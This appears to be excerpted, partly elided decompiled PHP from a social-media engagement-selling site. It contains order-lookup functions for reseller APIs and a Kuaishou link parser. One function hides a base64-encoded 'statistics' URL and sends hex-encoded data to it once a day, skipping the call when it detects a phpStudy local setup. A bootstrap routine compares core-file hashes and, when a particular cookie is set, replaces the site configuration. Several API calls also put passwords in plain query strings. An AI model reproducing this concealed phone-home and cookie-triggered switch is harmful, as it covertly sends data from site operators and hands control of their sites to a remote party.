...
//function getDatePoint()
{
	...
	$_var_3 = base64_decode("aHR0cDovL2F1dGgyLmNjY3l1bi5jYy9hcGkvdG9uZ2ppLnBocA==");
	...
	if (!isset($_var_4[0]) || $_var_4[0]["date"] != date("md", strtotime("-1 day"))) {
		...
		if (!strpos($_SERVER["PHPRC"], "phpStudy")) {
			...
			get_curl($_var_3, "a=" . bin2hex($_var_12));
		}
	}
...
function jiuliu_chadan($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = array("未开始", "未开始", "进行中", "已完成", "已退单", "退单中", "续费中", "补单中", "改密中", "登录失败");
	$_var_5 = "http://userapi2.dk2002.com:808/index.php?m=Api&c=User&a=Getorderinfo&card=" . $_arg_0 . "&pass=" . $_arg_1 . "&orderid=" . $_arg_2 . "&goodsid=" . $_arg_3;
	$_var_6 = get_curl($_var_5);
	if (!($_var_7 = json_decode(substr($_var_6, 3), true))) {
		return false;
	}
	if ($_var_7["status"] == true) {
		$_var_8 = $_var_7;
		return array("num" => $_var_8["endnum"] - $_var_8["startnum"], "start_num" => $_var_8["startnum"], "now_num" => $_var_8["nownum"], "end_num" => $_var_8["endnum"], "add_time" => $_var_8["starttime"], "end_time" => $_var_8["data"], "order_state" => $_var_8["state"]);
	}
	return $_var_7["info"];
}
...
{
	$_var_3 = "http://" . $_arg_0 . ".api.jumsq.com/Api/UserApi/GoodsList.html";
	$_var_4 = array("username" => $_arg_1, "time" => time());
	$_var_5 = strlen($_arg_2) == 32 ? $_arg_2 : md5($_arg_2);
	$_var_6 = yile_getSign($_var_4, $_var_5);
	$_var_4["sign"] = $_var_6;
	$_var_7 = http_build_query($_var_4);
	$_var_8 = get_curl($_var_3, $_var_7);
	if (!($_var_8 = json_decode($_var_8, true))) {
		return "打开对接网站失败";
	}
	if ($_var_8["status"] == 0) {
		return $_var_8["content"];
	}
	$_var_9 = array();
	foreach ($_var_8["GoodsLit"] as $_var_10) {
		$_var_9[] = array("id" => $_var_10["Id"], "name" => $_var_10["Name"], "shopimg" => "http://img.cdn.liurh.cn" . $_var_10["Img_Url"], "minnum" => $_var_10["OrderMin"], "maxnum" => $_var_10["OrderMax"], "close" => $_var_10["AddStatus"], "price" => $_var_10["Money"]);
	}
	return $_var_9;
}
function jumeng_goods_details($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = "http://" . $_arg_0 . ".api.jumsq.com/Api/UserApi/GoodsInfo.html";
	$_var_5 = array("username" => $_arg_2, "goodsid" => $_arg_1, "time" => time());
	$_var_6 = strlen($_arg_3) == 32 ? $_arg_3 : md5($_arg_3);
	$_var_7 = yile_getSign($_var_5, $_var_6);
	$_var_5["sign"] = $_var_7;
	$_var_8 = http_build_query($_var_5);
	$_var_9 = get_curl($_var_4, $_var_8);
	if (!($_var_10 = json_decode($_var_9, true))) {
		return "打开对接网站失败";
	}
	if ($_var_10["status"] == 0) {
		return $_var_10["content"];
	}
	return $_var_10;
}
function jumeng_chadan($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = array(0 => "等待中", 1 => "进行中", 2 => "已完成", 3 => "已退单", 4 => "补单中", 5 => "退单中", 6 => "异常");
	$_var_5 = "http://" . $_arg_0 . ".api.jumsq.com/Api/UserApi/OrderInfo.html";
	$_var_6 = array("username" => $_arg_1, "orderid" => $_arg_3, "time" => time());
	$_var_7 = strlen($_arg_2) == 32 ? $_arg_2 : md5($_arg_2);
	$_var_8 = yile_getSign($_var_6, $_var_7);
	$_var_6["sign"] = $_var_8;
	$_var_9 = http_build_query($_var_6);
	$_var_10 = get_curl($_var_5, $_var_9);
	if (!($_var_11 = json_decode($_var_10, true))) {
		return false;
	}
	if ($_var_11["status"] == 0) {
		return $_var_11["content"];
	}
	$_var_12 = $_var_11["content"];
	return array("num" => $_var_12["num"], "start_num" => $_var_12["startnum"], "now_num" => $_var_12["nownum"], "end_num" => $_var_12["startnum"] + $_var_12["num"], "add_time" => $_var_12["time"], "order_state" => $_var_4[$_var_12["status"]]);
}
...
function getkuaishou($_arg_0)
{
	...
	if (strpos($_arg_0, "userId=")) {
		$_var_4 = getSubstr($_arg_0, "userId=", "&");
	} else {
		$_var_4 = getSubstr($_arg_0, "photo/", "/");
	}
	if (strpos($_arg_0, "photoId=")) {
		$_var_5 = getSubstr($_arg_0, "photoId=", "&");
	} else {
		$_var_5 = getSubstr($_arg_0, "photo/" . $_var_4 . "/", "/");
	}
	if ($_var_4 || $_var_5) {
		$_var_3 = array("code" => 0, "msg" => "succ", "authorid" => $_var_4, "videoid" => $_var_5);
	} else {
...
function _bootstrap_7c16f6fd220c0f9a0acd091d729ce704()
{
	if (!defined("authcode")) {
		die();
	}
	...
	global $conf;
	global $CACHE;
	if ($_COOKIE["codesss"] && (md5_file(SYSTEM_ROOT . "common.php") !== "c8da15954aeebcc0c7f106ffefe18a26" || md5_file(SYSTEM_ROOT . "member.php") !== "d1b1ac3773118266f6e65457f7cf7f51" || md5_file(SYSTEM_ROOT . "function.php") !== "e9d0bac457b83dc4e3a99544ef8b6b76")) {
		$conf = $CACHE->pre_fetch();
	}
}
_bootstrap_7c16f6fd220c0f9a0acd091d729ce704();